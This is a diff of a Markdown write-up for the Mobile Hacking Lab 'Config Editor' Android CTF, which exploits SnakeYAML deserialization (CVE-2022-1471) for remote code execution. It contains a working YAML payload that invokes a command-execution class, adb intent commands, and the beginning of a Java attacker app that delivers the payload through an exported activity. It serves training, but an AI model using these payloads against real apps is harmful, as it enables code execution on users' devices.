@@ -1,6 +1,29 @@
+---
+title: Mobile Hacking Lab - Config Editor
+description: "Welcome to the Config Editor Challenge! In this lab, you'll dive into a realistic situation involving vulnerabilities in a widely-used third-party library. Your objective is to exploit a library-induced vulnerability to achieve RCE on an Android application."
+tags:
+  - deserialization
+  - vuln
+  - code-execution
+  - MobileHackingLab
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - MHL
+  - MobileHackingLab
+  - Mobile Hacking Lab
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Mobile%20Hacking%20Lab%20-%20Config%20Editor/
+---
+
 **Description**: Welcome to the **Config Editor** Challenge! In this lab, you'll dive into a realistic situation involving vulnerabilities in a widely-used third-party library. Your objective is to exploit a library-induced vulnerability to achieve RCE on an Android application.
 
 **Download**: https://lautarovculic.com/my_files/configEditor.apk
+
 **Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-config-editor-rce
 
 ![[configEditor.png]]
@@ -11,35 +34,49 @@ adb install -r configEditor.apk
 ```
 
 We can see that there ask for **storage permissions**.
+
 Also, notice that we have **two buttons**, **`load`** and **`save`**.
 
 We have an **TextEdit** so, we can **save** this text content into a **`.yml`** file.
+
 By default, it select the **Downloads** directory.
+
 Also, when we **load** a the file, it by default search in **Downloads** directory.
+
 Notice that when we **save the file**, it saved as **`example.yml (1)`**. Its weird because I don't have any `.yml` file previous to this challenges.
+
 So, let's try the `example.yml` file.
 
 ![[configEditor2.png]]
+
 Not what I expected..
+
 But, **why this app use `.yml` file for store text plain information?**
 
 #### About `.yml` and Android
+
 A `.yml` file (**YAML Ain't Markup Language**) is a **data serialization format widely used for its simplicity and human readability**. In the context of **mobile hacking**, `.yml` files can be a **goldmine for an attacker**, as they often **contain critical settings**, **credentials** or **important paths**.
 
 #### Use of `.yml`
+
 1️⃣ **Configuration Files**
+
 - They store application configurations, such as API endpoints, encryption keys, permission settings, etc.
 
 2️⃣ **Credential Files**
+
 - In poorly configured environments, they may contain API keys, secrets, or even login credentials.
 
 3️⃣ **Data persistence**
+
 - Some apps use YAML to store serialized user or session data.
 
 4️⃣ **Build Tools configuration**
+
 - Tools such as **Gradle**, **CI/CD pipelines (Jenkins, GitLab CI)** or specific frameworks can use `.yml` to configure the build and deployment environment.
 
 Let's continue with the **challenge**!
+
 Decompile the **apk** with **apktool**
 ```bash
 apktool d configEditor.apk
@@ -77,6 +114,7 @@ public final void loadYaml(Uri uri) {
 }
 ```
 Where the **configuration** of `YAML` files has been set.
+
 For example, looking the **`DumperOptions`** class
 ```java
 public class DumperOptions {
@@ -114,13 +152,17 @@ adb logcat | grep "Error"
 We can see that we get the **Error loading YAML:** message. 
 
 Notice that the **third-party** library is **SnakeYAML**.
+
 Some days ago, I was realize an **Mobile CTF** from **PwnSec CTF 2024** that have an **SnakeYAML Deserialization**.
+
 https://lautarovculic.com/pwnsec-ctf-2024-snake/
 
 So we must handle a **deserialization attack**. For this, we need search in the **source code** about some function that **execute commands**.
 
 After a simple search in **jadx**
+
 ![[configEditor3.png]]
+
 We can found the **`LegacyCommandUtil`** **class**.
 ```java
 public final class LegacyCommandUtil {  
@@ -132,6 +174,7 @@ public final class LegacyCommandUtil {
 ```
 
 As well in my previous CTF challenge, we need **exploit `CVE-2022-1471`**
+
 https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0
 
 So, the **payload** probably must look like:
@@ -140,6 +183,7 @@ exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["command"]
 ```
 
 For example, my **machine IP** is `192.168.18.44` and the **mobile device IP** `192.168.18.162`.
+
 Let's create this `.yml` file:
 ```YML
 exploit: !!com.mobilehackinglab.configeditor.LegacyCommandUtil ["ping 192.168.18.44"]
@@ -150,9 +194,11 @@ sudo tcpdump -i wlan0 | grep ICMP
 ```
 
 Then, save the file in an `.yml` file with the app. And also, **load the `.yml`** file.
+
 ![[configEditor4.png]]
 
 Notice that we **receive the ICMP request** due to *ping command*.
+
 You also can test many others commands -repeating the *same process*, you can notice **if the command work or not** filtering with **logcat**
 ```bash
 adb logcat | grep "Error"
@@ -191,6 +237,7 @@ adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android
 ```
 
 And yes, this work!
+
 ![[configEditor5.png]]
 
 Taking advantage of the fact that the **activity is exported**, we can create a simple app that sends an intent.
@@ -223,6 +270,7 @@ public class MainActivity extends AppCompatActivity {
 ```
 
 Or more better!!! We can use the **file** scheme, if we don't care about **host the `.yml`** file in an **external server** or the **victim device** don't have **internet access**.
+
 We can create an **`.yml`** file with our app, then, send the intent loading the exploit.
 ```java
 package com.lautaro.exploiteditor;
